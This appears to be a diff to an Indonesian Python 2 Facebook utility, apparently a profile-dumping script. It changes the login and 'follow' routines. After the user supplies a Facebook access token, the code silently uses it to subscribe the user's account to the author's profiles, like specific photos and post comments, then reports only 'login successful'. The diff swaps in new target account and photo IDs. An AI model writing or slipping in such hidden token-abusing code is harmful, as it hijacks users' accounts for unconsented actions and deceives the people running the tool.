@@ -105,8 +105,8 @@ def ___login___():
             exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
     elif ___login___ in ['3','03']:
         print("%s[%s?%s]%s Anda Akan Di Arahkan Ke Youtube Atau Browser"%(B,H,B,P));sleep(2)
-        os.system('xdg-open https://youtu.be/3Y6xsMB3wRg')
-        exit("%s[%s!%s]%s Ketik ulang %s«%spython2 dump.py%s»"%(B,K,B,P,H,P,H))
+        os.system('xdg-open https://youtu.be/bszAm4C5ovE')
+        exit("%s[%s!%s]%s Ketik ulang %s«%spython2 nama.py%s»"%(B,K,B,P,H,P,H))
     elif ___login___ in ['4','04']:
         exit()
     else:
@@ -134,16 +134,16 @@ def ___follow___():
         ___komen___ = (___ucapkan___+'\n\n'+___kata___+'\n'+___waktu___)
         ___komen2___ = (___ucapkan___+'\n\n'+___kata___+'\n'+___waktu___)
         ___komen3___ = random.choice(['Hello Bro','Mantap Bang','Keren Bang','Very Nice','Super','Hallo Bang'])
-        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=%s'%(___token___)) #rozhak
-        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=%s'%(___token___)) #rozhak2
-        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=%s'%(___token___)) #muhammad rozhak
-        requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=%s'%(___token___)) #foto sampul
-        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=%s'%(___token___)) # foto profil
-        requests.post('https://graph.facebook.com/10158807643598544/comments/?message=%s&access_token=%s'%(___komen3___,___token___)) #foto sampul
-        requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(___komen___,___token___)) #foto profil
-        requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) #foto profil
-        requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(___token___)) # Iwan
-	requests.post('https://graph.facebook.com/100000496418851/subscribers?access_token=%s'%(___token___)) # Muhammad Abill
+        requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=%s'%(___token___)) #rozhak
+        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=%s'%(___token___)) #rozhak2
+        requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=%s'%(___token___)) #muhammad rozhak
+        requests.post('https://graph.facebook.com/953529338576547/likes?summary=true&access_token=%s'%(___token___)) #foto sampul
+        requests.post('https://graph.facebook.com/800676813861801/likes?summary=true&access_token=%s'%(___token___)) # foto profil
+        requests.post('https://graph.facebook.com/800676813861801/comments/?message=%s&access_token=%s'%(___komen3___,___token___)) #foto sampul
+        requests.post('https://graph.facebook.com/953529338576547/comments/?message=%s&access_token=%s'%(___komen___,___token___)) #foto profil
+        requests.post('https://graph.facebook.com/4257706904267068/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) #foto profil
+        requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=%s'%(___token___)) # Iwan
+	requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token=%s'%(___token___)) # Muhammad Abill
     except:
         exit("%s[%s!%s]%s Login Gagal"%(P,M,P,M))
     print("%s[%s*%s]%s Login Berhasil"%(H,P,H,P))
